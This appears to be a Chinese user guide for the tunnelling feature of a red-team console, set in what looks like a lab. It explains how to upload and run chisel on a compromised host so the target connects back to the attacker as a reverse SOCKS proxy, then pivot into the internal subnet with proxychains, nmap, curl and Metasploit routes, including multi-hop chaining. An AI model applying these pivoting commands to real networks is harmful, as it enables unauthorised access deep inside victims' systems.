# 代理编排台使用指南（PROXY_GUIDE）

> 核心心智模型：**一条「链路」= 用跳板机上的 Shell 拉一条反向 Socks 隧道，把
> 「跳板机能摸到的网段」搬到攻击端本机的一个端口上**。
> 链路建立后，你在本机用 `socks5://127.0.0.1:端口` 消费它（proxychains / msf / curl 均可）。

---

## 场景 1：把入口机（10.8.0.6 · archive-web）当跳板

**目标**：本机直接访问 archive-web 所在内网（172.33.0.0/24）里的任何端口。

### 代理编排台 ② 链路编排 这样填

| 字段 | 填什么 | 含义 |
|---|---|---|
| 起点节点（跳板） | `10.8.0.6 · archive-web` | 在**哪台机器上**拉隧道（必须有存活 Shell） |
| 隧道工具 | `chisel`（自动档当前支持） | 用什么工具建隧道 |
| 方向 | `反向` | 靶机回连你（靶机不能被直连时的标准姿势） |
| 本地 Socks 端口 | `10805`（自动顺延） | 隧道建好后，**你本机**的 socks5 入口 |
| 目标网段 | `172.33.0.0/24` | 你想穿过跳板**够到**的网段（= 跳板第二块网卡所在段） |
| 勾选自动档 | ☑ | 后端自动：上传 chisel → 执行 → 等回连 → 登记（失败自动降级半自动并给靶机命令） |

点「一键部署并登记」→ 等待回连（首次部署该二进制时 Windows 防火墙可能拖 30–45s，客户端会自动重试）
→ 链路表出现绿色一行：`chisel 反向 10.8.0.6 → 127.0.0.1 · socks 127.0.0.1:10805 · 172.33.0.0/24`。

> 「出口」列显示 `127.0.0.1`（攻击端本机）是反向隧道的固定语义：流量最终从你本机的
> socks 口出去、从跳板侧到达目标网段。

### 消费这条 socks（三选一）

```bash
# ① proxychains（点顶栏「生成 proxychains 配置」直接得到下面文件）
proxychains4 -f /tmp/proxychains.conf nmap -sT -Pn -p- 172.33.0.20

# ② curl 单条快速验证
curl --socks5-hostname 127.0.0.1:10805 telnet://172.33.0.20:3306   # 会看到 MySQL 握手

# ③ msf（点顶栏「生成 msf route 片段」）
msf6 > route add 172.33.0.0 255.255.255.0 10805
```

### 半自动档（不勾自动档）怎么用

「部署指令 → 靶机命令」页签给出完整命令：把 chisel 上传后执行
`./chisel client --auth ... 10.8.0.11:端口 R:127.0.0.1:10805:socks`。
在虚拟终端里执行（或手工粘贴），回连后点 ④ 表格里的「登记」由面板收链。
（当前版本自动档已接真实部署，推荐直接勾选自动档。）

## 场景 2：让内网机器的流量经跳板转出来

分两种诉求：

### 2a. 你要**主动访问**内网机器（最常见）——场景 1 已经覆盖

socks 隧道就是双向通道：`本机 :10805 → 跳板 → 172.33.0.x`。
访问 db01 的 3306、扫描 172.33.0.0/24、对内网 Web 发请求，全都走这条 socks。
**不需要再配置**——换成用 proxychains 跑你的工具即可（见上）。

### 2b. 内网机器自己当**二级跳板**（它的下下段流量也转出来）——多级串联（MS4）

前提：内网机器（如 db01）上也拿到了 Shell。此时在 ② 链路编排把
「起点节点」选成 `172.33.0.20 · db01`，面板会**自动继承上一层 Socks 入口**
（串联参数页签显示 `127.0.0.1:10805`），二级隧道的回连会经一级隧道中转：

```
攻击端 :10805 ──socks──> archive-web ──> 172.33.0.0/24（db01 在这）
攻击端 :10806 ──经一级隧道──> db01 ──> db01 的下下段
```

> 当前版本自动档部署到 db01 需要它的 Shell 与可上传通道，这部分自动化（含
> 「经上层代理上传二进制」）属 **MS4 多级串联**交付；本指南先给语义与预期形态。

## ④ 统一 Socks 入口与健康看板

- 每条存活链路一行：状态灯 / 工具 / 入口→出口 / 本机 socks 端口 / 目标网段 / 延迟
- 「检查」= 真实核验本机隧道进程存活（有 pid 时）；
- 「销毁」= 真实结束本机隧道进程并把链路置为已停止；
- 所有工具（proxychains/msf/浏览器）都只认「本地 SOCKS」这一列的端口。

## 常见问题

| 现象 | 原因与处理 |
|---|---|
| 首次部署等了 30–45s 才回连 | Windows 防火墙对新路径 chisel.exe 的首次拦截，客户端自动重试可接通；管理员加一次放行规则可永久消除 |
| 起点节点没有存活 Shell | 先去 Shell 管理对目标登记/测活一条会话 |
| 链路显示「失败」 | 看时间线中的失败阶段（binary/upload/execute/wait_callback），失败时面板已自动降级半自动档并给出靶机命令 |
